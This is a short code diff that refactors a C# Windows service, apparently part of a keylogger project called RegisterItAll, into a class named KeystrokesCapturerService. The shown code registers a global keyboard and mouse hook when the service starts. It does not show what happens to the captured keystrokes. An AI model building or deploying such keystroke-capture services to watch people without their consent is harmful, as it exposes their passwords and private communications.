@@ -1,22 +1,13 @@
 ﻿using Gma.System.MouseKeyHook;
+using RegisterItAll.Services.Base;
 using System;
 using System.IO;
-using System.ServiceProcess;
 using System.Windows.Forms;
 
-namespace RegisterItAll
+namespace RegisterItAll.Services
 {
-    public partial class RegisterItAllService : ServiceBase
+    public partial class KeystrokesCapturerService : ExecutableAsConsoleApplicationService
     {
-        public void ExecuteAsConsoleApplication(string[] args)
-        {
-            this.OnStart(args);
-
-            Console.ReadLine();
-
-            this.OnStop();
-        }
-
         protected override void OnStart(string[] args)
         {
             IKeyboardMouseEvents hook = Hook.GlobalEvents();
